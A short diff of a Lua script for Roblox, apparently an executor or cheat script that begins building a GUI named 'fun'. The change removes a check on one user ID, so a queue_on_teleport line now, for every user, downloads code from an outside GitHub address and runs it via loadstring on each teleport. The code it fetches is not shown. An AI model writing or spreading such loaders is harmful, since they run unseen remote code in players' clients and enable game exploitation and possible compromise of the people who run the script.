@@ -1,9 +1,7 @@
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 
-if Players.LocalPlayer.UserId ~= 4846427393 then
-  queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/execute500/scripts/refs/heads/main/%3F'))()")
-end
+queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/execute500/scripts/refs/heads/main/%3F'))()")
 
 local Main = Instance.new("ScreenGui")
 Main.Name = "fun"
